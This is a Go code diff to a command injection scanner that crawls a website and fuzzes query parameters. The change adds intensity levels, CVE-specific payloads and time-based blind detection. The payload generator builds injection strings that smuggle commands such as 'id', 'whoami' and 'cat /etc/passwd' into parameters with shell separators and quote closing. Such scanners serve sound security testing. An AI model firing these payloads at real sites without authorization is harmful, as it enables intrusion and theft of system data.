@@ -44,6 +44,8 @@ type CmdInjScanner struct {
 	PageCountMu sync.Mutex
 	MaxDepth    int
 	Payloads    []string
+	Intensity   int
+	TargetedCVEs []string
 	Throttle    time.Duration
 }
 
@@ -53,8 +55,7 @@ type cmdInjCrawlJob struct {
 	Depth int
 }
 
-// NewCmdInjScanner creates a new instance of the Command Injection scanner
-func NewCmdInjScanner(start string, workers, maxPages, maxDepth int, throttle time.Duration) (*CmdInjScanner, error) {
+func NewCmdInjScanner(start string, workers, maxPages, maxDepth int, throttle time.Duration, intensity int, targetedCVEs []string, customPayloads []string) (*CmdInjScanner, error) {
 	parsed, err := url.Parse(start)
 	if err != nil {
 		return nil, err
@@ -63,17 +64,21 @@ func NewCmdInjScanner(start string, workers, maxPages, maxDepth int, throttle ti
 		Timeout: 20 * time.Second,
 	}
 
+	payloads := generateCmdInjPayloads(intensity, targetedCVEs, customPayloads)
+
 	s := &CmdInjScanner{
-		StartURL: parsed,
-		Client:   client,
-		Visited:  make(map[string]bool),
-		Queue:    make(chan cmdInjCrawlJob, 1000),
-		Findings: []FindingCmdInj{},
-		Workers:  workers,
-		MaxPages: maxPages,
-		MaxDepth: maxDepth,
-		Throttle: throttle,
-		Payloads: generateCmdInjPayloads(),
+		StartURL:     parsed,
+		Client:       client,
+		Visited:      make(map[string]bool),
+		Queue:        make(chan cmdInjCrawlJob, 1000),
+		Findings:     []FindingCmdInj{},
+		Workers:      workers,
+		MaxPages:     maxPages,
+		MaxDepth:     maxDepth,
+		Throttle:     throttle,
+		Payloads:     payloads,
+		Intensity:    intensity,
+		TargetedCVEs: targetedCVEs,
 	}
 	return s, nil
 }
@@ -177,8 +182,6 @@ func (s *CmdInjScanner) fuzzURL(rawURL string) {
 	}
 
 	for param, values := range query {
-		originalValue := values[0]
-
 		for _, payload := range s.Payloads {
 			if s.Throttle > 0 {
 				time.Sleep(s.Throttle)
@@ -195,10 +198,12 @@ func (s *CmdInjScanner) fuzzURL(rawURL string) {
 			}
 			req.Header.Set("User-Agent", "Knife-CmdInj-Scanner/1.0")
 
+			startTime := time.Now()
 			resp, err := s.Client.Do(req)
 			if err != nil {
 				continue
 			}
+			duration := time.Since(startTime)
 
 			bodyBytes, err := io.ReadAll(io.LimitReader(resp.Body, 50000))
 			resp.Body.Close()
@@ -207,6 +212,7 @@ func (s *CmdInjScanner) fuzzURL(rawURL string) {
 			}
 			bodyStr := string(bodyBytes)
 
+			// Simple signature detection
 			if evidence, found := s.detectCmdInj(bodyStr); found {
 				s.addFinding(FindingCmdInj{
 					Type:            "Command Injection",
@@ -217,8 +223,21 @@ func (s *CmdInjScanner) fuzzURL(rawURL string) {
 					Evidence:        evidence,
 				})
 			}
+
+			// Time-based detection (Intensity > 3)
+			if s.Intensity > 3 && strings.Contains(payload, "sleep") {
+				if duration >= 5*time.Second {
+					s.addFinding(FindingCmdInj{
+						Type:            "Blind Command Injection (Time-based)",
+						URL:             testURL,
+						Param:           param,
+						Payload:         payload,
+						ResponseSnippet: "N/A (Blind)",
+						Evidence:        fmt.Sprintf("Delayed response: %v (expected ~5s)", duration),
+					})
+				}
+			}
 		}
-		_ = originalValue
 	}
 }
 
@@ -248,58 +267,52 @@ func (s *CmdInjScanner) detectCmdInj(body string) (string, bool) {
 	return "", false
 }
 
-func generateCmdInjPayloads() []string {
-	// Separators: ; | & && \n $( ) `
-	separators := []string{";", "|", "&", "&&", "\n", "`", "$()"}
-	commands := []string{
-		"id",
-		"whoami",
-		"cat /etc/passwd",
-		"uname -a",
-		"ping -c 1 127.0.0.1",
-		"ipconfig",
-		"dir",
-		"type C:\\Windows\\win.ini",
+func generateCmdInjPayloads(intensity int, targetedCVEs []string, customPayloads []string) []string {
+	var payloads []string
+
+	// CVE-specific payloads
+	for _, id := range targetedCVEs {
+		if cve, ok := GetCVEDatabase()[id]; ok && cve.Type == ScannerCommandInjection {
+			payloads = append(payloads, cve.Payloads...)
+		}
 	}
 
-	var payloads []string
+	// Separators: ; | & && \n $( ) `
+	separators := []string{";", "|", "&", "&&", "\n", "`", "$()"}
+	commands := []string{"id", "whoami"}
+
+	if intensity > 2 {
+		commands = append(commands, "cat /etc/passwd", "uname -a", "ipconfig")
+	}
+
+	if intensity > 3 {
+		commands = append(commands, "sleep 5", "ping -c 5 127.0.0.1")
+	}
 
 	// Basic injection
 	for _, sep := range separators {
 		for _, cmd := range commands {
 			payloads = append(payloads, sep+" "+cmd)
-			payloads = append(payloads, sep+cmd) // No space
+			payloads = append(payloads, sep+cmd)
 		}
 	}
 
-	// Quote closing
-	quotes := []string{"'", "\""}
-	for _, q := range quotes {
-		for _, sep := range separators {
-			for _, cmd := range commands {
-				payloads = append(payloads, q+sep+" "+cmd)
-				payloads = append(payloads, q+sep+cmd+sep) // Close and reopen?
+	if intensity > 3 {
+		// Quote closing and complex variants
+		quotes := []string{"'", "\""}
+		for _, q := range quotes {
+			for _, sep := range separators {
+				for _, cmd := range commands {
+					payloads = append(payloads, q+sep+" "+cmd)
+					payloads = append(payloads, q+sep+cmd+sep)
+				}
 			}
 		}
 	}
 
-	// Specific complex payloads
-	payloads = append(payloads,
-		"|| id",
-		"&& id",
-		"; id",
-		"| id",
-		"`id`",
-		"$(id)",
-		"& id",
-		"a;id",
-		"a|id",
-		"a&id",
-		"127.0.0.1; cat /etc/passwd",
-		"127.0.0.1 | cat /etc/passwd",
-		"127.0.0.1 & cat /etc/passwd",
-		"127.0.0.1 && cat /etc/passwd",
-	)
+	if len(customPayloads) > 0 {
+		payloads = append(payloads, customPayloads...)
+	}
 
 	return payloads
 }
